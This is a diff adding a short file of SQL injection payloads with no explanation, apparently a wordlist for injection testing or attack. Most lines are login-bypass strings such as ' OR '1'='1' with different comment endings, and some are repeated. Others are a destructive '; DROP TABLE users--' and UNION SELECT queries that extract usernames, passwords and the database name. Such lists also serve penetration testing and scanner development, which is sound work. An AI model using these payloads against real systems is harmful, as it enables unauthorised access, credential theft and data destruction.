@@ -1,0 +1,15 @@
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1' #
+" OR "1"="1" #
+' OR '1'='1' /*
+" OR "1"="1" /*
+' OR '1'='1'--
+" OR "1"="1"--
+' OR '1'='1' #
+" OR "1"="1" #
+' OR '1'='1' /*
+" OR "1"="1" /*
+'; DROP TABLE users--
+' UNION SELECT null, username, password FROM users --
+' UNION SELECT null, database(), null --
